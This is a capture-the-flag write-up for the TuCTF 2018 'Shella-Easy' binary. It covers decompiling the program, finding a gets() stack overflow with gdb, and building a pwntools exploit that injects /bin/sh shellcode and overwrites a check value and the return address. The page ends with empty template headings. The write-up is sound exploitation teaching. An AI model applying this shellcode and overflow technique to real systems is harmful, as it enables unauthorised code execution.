---
search:
  exclude: true
---
# TuCTF 2018 Shella-Easy

## Downloading the binary file 
    
    
    [ 192.168.0.18/24 ] [ /dev/pts/14 ] [binexp/2/shella]
    → wget https://github.com/guyinatuxedo/nightmare/raw/master/modules/06-bof_shellcode/tu18_shellaeasy/shella-easy
    --2021-03-05 17:20:57--  https://github.com/guyinatuxedo/nightmare/raw/master/modules/06-bof_shellcode/tu18_shellaeasy/shella-easy
    Loaded CA certificate '/etc/ssl/certs/ca-certificates.crt'
    Resolving github.com (github.com)... 140.82.121.4
    Connecting to github.com (github.com)|140.82.121.4|:443... connected.
    HTTP request sent, awaiting response... 302 Found
    Location: https://raw.githubusercontent.com/guyinatuxedo/nightmare/master/modules/06-bof_shellcode/tu18_shellaeasy/shella-easy [following]
    --2021-03-05 17:20:57--  https://raw.githubusercontent.com/guyinatuxedo/nightmare/master/modules/06-bof_shellcode/tu18_shellaeasy/shella-easy
    Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.110.133, 185.199.109.133, 185.199.108.133, ...
    Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.110.133|:443... connected.
    HTTP request sent, awaiting response... 200 OK
    Length: 7404 (7.2K) [application/octet-stream]
    Saving to: ‘shella-easy’
    
    shella-easy                                                            100%[============================================================================================================================================================================>]   7.23K  --.-KB/s    in 0s
    
    2021-03-05 17:20:57 (20.9 MB/s) - ‘shella-easy’ saved [7404/7404]
    
    
    [ 192.168.0.18/24 ] [ /dev/pts/14 ] [binexp/2/shella]
    → file shella-easy
    shella-easy: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=38de2077277362023aadd2209673b21577463b66, not stripped
    
    [ 192.168.0.18/24 ] [ /dev/pts/14 ] [binexp/2/shella]
    → chmod +X shella-easy
    
    

` ![]()

## Solution 

First let's run the binary to see what it does:
    
    
    [ 192.168.0.18/24 ] [ /dev/pts/14 ] [binexp/2/shella]
    → ./shella-easy
    Yeah I'll have a 0xffa70630 with a side of fries thanks
    yes
    
    [ 192.168.0.18/24 ] [ /dev/pts/14 ] [binexp/2/shella]
    → ./shella-easy
    Yeah I'll have a 0xff94b1a0 with a side of fries thanks
    no
    
    

Very similar to the previous challenge we did, the binary prints out some text with a memory address, and then asks us for some text input. Let's see what we can find in ghidra:

![](25.png)

Which gives us the following code:
    
    
    undefined4 main(void)
    
    {
      char local_4c [64];
      int local_c;
      
      setvbuf(stdout,(char *)0x0,2,0x14);
      setvbuf(stdin,(char *)0x0,2,0x14);
      local_c = -0x35014542;
      printf("Yeah I\'ll have a %p with a side of fries thanks\n",local_4c);
      gets(local_4c);
      if (local_c != -0x21524111) {
                        /* WARNING: Subroutine does not return */
        exit(0);
      }
      return 0;
    }
    
    

Here we see that our input text gets stored into the variable local_4c and gets passed through a gets() function, and we know that the gets call does not restrict user input, therefore we know we can do a buffer overflow thanks to it. The plan here is to first push shellcode onto the stack, and we know where it is thanks to the memory address that's given to us, then we fill the gap with nullbytes, and then overwrite the return address to point to the start of our shellcode

However, according to the decompiled code, the function exit is called, when this function is called, the ret instruction will not run in the context of this function, so we won't get code execution. So let's look at the assembly :

![](26.png)
    
    
            08048539 e8 52 fe        CALL       gets                                             char * gets(char * __s)
                     ff ff
            0804853e 83 c4 04        ADD        ESP,0x4
            08048541 81 7d f8        CMP        dword ptr [EBP + local_c],0xdeadbeef
                     ef be ad de
            08048548 74 07           JZ         LAB_08048551
            0804854a 6a 00           PUSH       0x0
            0804854c e8 4f fe        CALL       exit                                             void exit(int __status)
                     ff ff
                                 -- Flow Override: CALL_RETURN (CALL_TERMINATOR)
                                 LAB_08048551                                    XREF[1]:     08048548(j)  
            08048551 b8 00 00        MOV        EAX,0x0
                     00 00
            08048556 8b 5d fc        MOV        EBX,dword ptr [EBP + local_8]
            08048559 c9              LEAVE
            0804855a c3              RET
    
    

Here we see that there is a check to see if the variable local_c is equal to 0xdeadbeef, and if it is, the function doesn't call exit(0), and we end up with our code execution. Now let's take a look at the stack layout in ghidra:
    
    
                                 **************************************************************
                                 *                          FUNCTION                          *
                                 **************************************************************
                                 undefined main()
                 undefined         AL:1           
                 undefined4        Stack[-0x8]:4  local_8                                 XREF[1]:     08048556(R)  
                 undefined4        Stack[-0xc]:4  local_c                                 XREF[2]:     0804851b(W), 
                                                                                                       08048541(R)  
                 undefined1        Stack[-0x4c]:1 local_4c                                XREF[2]:     08048522(*), 
                                                                                                       08048535(*)  
                                 main                                            XREF[4]:     Entry Point(*), 
                                                                                              _start:080483f7(*), 08048630, 
                                                                                              080486a0(*)  
            080484db 55              PUSH       EBP
    
    

We see that the local_c variable is within range of our overflowing variable (local_4c) where we put our text in. So, now that we know that, we need to find out what the offset is between the memory address of our input and the memory address of the return address, to do so we use gdb:
    
    
    [ 192.168.0.18/24 ] [ /dev/pts/14 ] [binexp/2/shella]
    → gdb ./shella-easy
    GNU gdb (GDB) 10.1
    Copyright (C) 2020 Free Software Foundation, Inc.
    License GPLv3+: GNU GPL version 3 or later 
    This is free software: you are free to change and redistribute it.
    There is NO WARRANTY, to the extent permitted by law.
    Type "show copying" and "show warranty" for details.
    This GDB was configured as "x86_64-pc-linux-gnu".
    Type "show configuration" for configuration details.
    For bug reporting instructions, please see:
    .
    Find the GDB manual and other documentation resources online at:
        .
    
    For help, type "help".
    Type "apropos word" to search for commands related to "word"...
    GEF for linux ready, type `gef' to start, `gef config' to configure
    92 commands loaded for GDB 10.1 using Python engine 3.9
    Reading symbols from ./shella-easy...
    (No debugging symbols found in ./shella-easy)
    gef➤  disas main
    Dump of assembler code for function main:
       0x080484db <+0>:     push   ebp
       0x080484dc <+1>:     mov    ebp,esp
       0x080484de <+3>:     push   ebx
       0x080484df <+4>:     sub    esp,0x44
       0x080484e2 <+7>:     call   0x8048410 <__x86.get_pc_thunk.bx>
       0x080484e7 <+12>:    add    ebx,0x1b19
       0x080484ed <+18>:    mov    eax,DWORD PTR [ebx-0x4]
       0x080484f3 <+24>:    mov    eax,DWORD PTR [eax]
       0x080484f5 <+26>:    push   0x14
       0x080484f7 <+28>:    push   0x2
       0x080484f9 <+30>:    push   0x0
       0x080484fb <+32>:    push   eax
       0x080484fc <+33>:    call   0x80483c0 
       0x08048501 <+38>:    add    esp,0x10
       0x08048504 <+41>:    mov    eax,DWORD PTR [ebx-0x8]
       0x0804850a <+47>:    mov    eax,DWORD PTR [eax]
       0x0804850c <+49>:    push   0x14
       0x0804850e <+51>:    push   0x2
       0x08048510 <+53>:    push   0x0
       0x08048512 <+55>:    push   eax
       0x08048513 <+56>:    call   0x80483c0 
       0x08048518 <+61>:    add    esp,0x10
       0x0804851b <+64>:    mov    DWORD PTR [ebp-0x8],0xcafebabe
       0x08048522 <+71>:    lea    eax,[ebp-0x48]
       0x08048525 <+74>:    push   eax
       0x08048526 <+75>:    lea    eax,[ebx-0x1a20]
       0x0804852c <+81>:    push   eax
       0x0804852d <+82>:    call   0x8048380 
       0x08048532 <+87>:    add    esp,0x8
       0x08048535 <+90>:    lea    eax,[ebp-0x48]
       0x08048538 <+93>:    push   eax
       0x08048539 <+94>:    call   0x8048390 
       0x0804853e <+99>:    add    esp,0x4
       0x08048541 <+102>:   cmp    DWORD PTR [ebp-0x8],0xdeadbeef
       0x08048548 <+109>:   je     0x8048551 
       0x0804854a <+111>:   push   0x0
       0x0804854c <+113>:   call   0x80483a0 
       0x08048551 <+118>:   mov    eax,0x0
       0x08048556 <+123>:   mov    ebx,DWORD PTR [ebp-0x4]
       0x08048559 <+126>:   leave
       0x0804855a <+127>:   ret
    End of assembler dump.
    
    

Here we want to set a breakpoint after the gets call at +99:
    
    
    gef➤  b *main+99
    Breakpoint 1 at 0x804853e
    gef➤  r
    Starting program: /home/nothing/binexp/2/shella/shella-easy
    Yeah I'll have a 0xffffd0a0 with a side of fries thanks
    13371337
    
    Breakpoint 1, 0x0804853e in main ()
    [ Legend: Modified register | Code | Heap | Stack | String ]
    ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
    $eax   : 0xffffd0a0  →  "13371337"
    $ebx   : 0x0804a000  →  0x08049f0c  →  0x00000001
    $ecx   : 0xf7f90540  →  0xfbad208b
    $edx   : 0xfbad208b
    $esp   : 0xffffd09c  →  0xffffd0a0  →  "13371337"
    $ebp   : 0xffffd0e8  →  0x00000000
    $esi   : 0x1
    $edi   : 0x080483e0  →  <_start+0> xor ebp, ebp
    $eip   : 0x0804853e  →   add esp, 0x4
    $eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
    $cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
    ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
    0xffffd09c│+0x0000: 0xffffd0a0  →  "13371337"    ← $esp
    0xffffd0a0│+0x0004: "13371337"
    0xffffd0a4│+0x0008: "1337"
    0xffffd0a8│+0x000c: 0x00000000
    0xffffd0ac│+0x0010: 0xf7dd8b82  →  <__internal_atexit+66> add esp, 0x10
    0xffffd0b0│+0x0014: 0xf7f903bc  →  0xf7f919e0  →  0x00000000
    0xffffd0b4│+0x0018: 0xffffffff
    0xffffd0b8│+0x001c: 0x080483e0  →  <_start+0> xor ebp, ebp
    ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
        0x8048535         lea    eax, [ebp-0x48]
        0x8048538         push   eax
        0x8048539         call   0x8048390 
     →  0x804853e         add    esp, 0x4
        0x8048541        cmp    DWORD PTR [ebp-0x8], 0xdeadbeef
        0x8048548        je     0x8048551 
        0x804854a        push   0x0
        0x804854c        call   0x80483a0 
        0x8048551        mov    eax, 0x0
    ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
    [#0] Id 1, Name: "shella-easy", stopped 0x804853e in main (), reason: BREAKPOINT
    ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
    [#0] 0x804853e → main()
    ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
    gef➤
    
    

After setting the breakpoint, we ran the binary, and then we passed a pattern that is easy to remember (13371337).Now that we hit our breakpoint, we want to know where is our pattern located: 
    
    
    gef➤  search-pattern 13371337
    [+] Searching '13371337' in memory
    [+] In '[stack]'(0xfffdd000-0xffffe000), permission=rwx
      0xffffd0a0 - 0xffffd0a8  →   "13371337"
    gef➤  info frame
    Stack level 0, frame at 0xffffd0f0:
     eip = 0x804853e in main; saved eip = 0xf7dbfa0d
     Arglist at 0xffffd0e8, args:
     Locals at 0xffffd0e8, Previous frame's sp is 0xffffd0f0
     Saved registers:
      ebx at 0xffffd0e4, ebp at 0xffffd0e8, eip at 0xffffd0ec
    
    

Here we see that our 13371337 pattern is located at **0xffffd0a0** and the return address is located at **0xffffd0ec** so let's calculate the offset:
    
    
    [ 192.168.0.18/24 ] [ /dev/pts/2 ] [binexp/2/shella]
    → python3
    Python 3.9.2 (default, Feb 20 2021, 18:40:11)
    [GCC 10.2.0] on linux
    Type "help", "copyright", "credits" or "license" for more information.
    >>> hex( 0xffffd0a0  - 0xffffd0ec )
    '-0x4c'
    
    

And we see that we have a 0x4c offset between our input text and the return function. With this we can create our exploit using the shellcode we used for the previous challenge:
    
    
    [ 192.168.0.18/24 ] [ /dev/pts/2 ] [binexp/2/shella]
    → vim exploit.py
    
    
    
    
    from pwn import *
    
    target = process('./shella-easy')
    
    leak = target.recvline()
    leak = leak.strip(b"Yeah I'll have a ")
    leak = leak.strip(b" with a side of fries thanks\n")
    
    Adr = int(leak, 16)
    
    payload  = b""
    # http://shell-storm.org/shellcode/files/shellcode-827.php
    payload += b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
    payload += b"\x00" * (0x40 - len(payload))      # Padding to the local_c variable
    payload += p32(0xdeadbeef)                      #overwrite local_c with 0xdeadbeef
    payload += b"\x00"*8                            #padding to the return address
    payload += p32(Adr)                             # Overwrite the return address to point to the start of our payload, where the shellcode is
    
    
    #hexdump the payload:
    print(hexdump(payload))
    
    

Here we can see our payload (shellcode + nullbytes to get to 0x40 + little endian deadbeef + 8 nullbytes + little endian leaked address):
    
    
    [ 192.168.0.18/24 ] [ /dev/pts/14 ] [binexp/2/shella]
    → python3 exploit.py
    [+] Starting local process './shella-easy': pid 1269456
    00000000  31 c0 50 68  2f 2f 73 68  68 2f 62 69  6e 89 e3 50  │1·Ph│//sh│h/bi│n··P│
    00000010  53 89 e1 b0  0b cd 80 00  00 00 00 00  00 00 00 00  │S···│····│····│····│
    00000020  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    *
    00000040  ef be ad de  00 00 00 00  00 00 00 00  10 0a 84 ff  │····│····│····│····│
    00000050
    
    

Now we send the payload to the binary file with the following 2 lines:
    
    
    target.sendline(payload)
    target.interactive()
    
    
    
    
    
    
    
    
    
    
    
    
    
    

![]()

![]()

![]()

![]()

![]()

![]()

![]()

![]()

![]()

![]()

![]()

## Title 

text 
    
    
    

` ![]()

## Title 

text 
    
    
    

` ![]()

